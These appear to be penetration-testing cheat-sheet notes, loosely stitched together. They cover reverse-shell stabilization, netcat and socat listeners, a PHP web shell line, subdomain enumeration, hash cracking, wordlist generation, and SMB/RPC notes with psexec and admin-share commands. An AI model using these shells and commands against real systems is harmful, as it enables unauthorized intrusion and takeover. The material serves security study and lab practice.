docs.title: High: Exploit via Exploit Mitigation
docs.text:
IOA Name: HeapSprayAttempted IOA Description: Detected and blocked a heap spray attempt, which was likely part of an attempted exploit.

See this comment for investigations: https://reddit.com/r/crowdstrike/comments/i7un8s/handling_false_positive_exploit_mitigation_for/

docs.text:
Info

"Reverse shells allow attackers to open ports to the target machines, forcing communication and enabling a complete takeover of the target machine." -Imperva

docs.title: Stabilization
docs.text: Basic: python3 -c 'import pty;pty.spawn("/bin/bash")' script /dev/null -c bash

docs.title: TTY Size
docs.text: In second terminal window, get rows & columns with stty -a, then set them in the remote shell with stty {rows|cols} <number>

docs.title: Netcat
docs.text:
Rlwrap: rlwrap nc -lvnp <port> If Python is available: 

sudo nc -lvnp 1234  # listen for connections on port 1234
python -c 'import pty;pty.spawn("/bin/bash")'   # start bash
export TERM=xterm
[Ctrl+Z]    # background the session
stty raw -echo; fg     # Stabilze and foreground the shell
Netcat for Windows

docs.title: Socat
docs.text:
If Python is available: 

# Start Python webserver on local machine
sudo python3 -m http.server 80
# Get a netcat shell
sudo nc -lvnp <port> 
# Download socat compiled binary to target machine
wget \<local IP>/socat -O /tmp/socat

<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>

Tools related to domains and/or IP addresses, ASNs, certificates, etc.

docs.title: Web Tools
docs.text:
• URLVoid - check domain reputation
  • DNSDumpster - query DNS records, geoIP, subdomains, domain map
  • crt.sh - query TLS certificates for a domain

docs.title: CLI
docs.text:
• Amass
    • amass enum -src -ip -brute -d [url]
    • Slowest, but most thorough
  • Sublist3r
    • python3 sublist3r.py -d [url]
    • Fast, but only finds common subdomains
  • Photon

docs.title: Cracking
docs.text:
• Haiti - identify hashes, tell you the hashcat/john mode to use
    • Install with gem install haiti-hash
  • Search That Hash - identify hashes and attempt to crack them
  • Hashcat
    • Hash mode examples
  • John the Ripper
    • john <hashfile> --format=<format> --wordlist=</path/to/wordlist>
    • Formats

docs.title: Wordlists
docs.text:

  • wordlistctl

docs.title: Generating Wordlists
docs.text:
• Mentalist - given a list, creates variations of it (i.e. hello -> h3ll0)
  • CeWL - grab words from a URL     - e.g. download all words from example.org with a depth of 2: cewl -d 2 -w $(pwd)/example.txt https://example.org
  • TTPassGen     - e.g. create wordlist containing all combinations of 4 digits ttpassgen --rule '[?d]{4:4:*}' out.txt     - all lowercase character combinations of length 1 - 3 ttpassgen --rule '[?l]{1:3:*}' out.txt     - combination of the above: ttpassgen --dictlist 'pin.txt,abc.txt' --rule '$0[-]{1}$1' combination.txt

docs.title: Common Services
docs.text:
Info

Basic information about various Windows services.

Good resource: Strontic

docs.title: NetBIOS
docs.text:
• Network Basic Input/Output System
    • Port 139
  • Provides services related to session layer of OSI model
    • Allows applications on separate devices to talk over the LAN
    • Strictly an API, not a network protocol
  • Often used for communication of data for files and printers through the session layer

docs.title: SMB
docs.text:
• Server Message Block
    • Port 139 and 445
  • Network file sharing protocol
  • Requires open port on the server

docs.title: Common Vulnerabilities
docs.text:
• Unprotected admin shares smbclient -N \\\\<target IP>\\C$ -U {Guest|Administrator}
  • Unprotected users Remote shell with [[Impacket]]: psexec.py Administrator@<target IP>

docs.title: RPC
docs.text:
• Remote Procedure Call
    • port 135
  • Supports communications between Windows applications using RPC protocol
    • Low-level interprocess communication; client process can make requests to server process
  • COM and DCOM built on top of RPC
  • Service name RpcSs; runs inside shared services host process svchost.exe
